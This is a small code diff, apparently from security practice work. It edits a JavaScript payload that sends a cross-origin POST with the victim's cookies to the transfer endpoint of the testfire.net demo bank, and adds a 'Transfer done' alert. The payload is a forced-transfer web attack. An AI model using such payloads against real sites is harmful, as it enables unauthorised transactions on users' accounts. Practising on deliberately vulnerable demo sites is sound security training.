@@ -19,6 +19,7 @@ fetch("https://demo.testfire.net/bank/doTransfer", {
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
+}).then(()=>{
+    
+    alert("Transfer done")
 });
-
-alert("1")
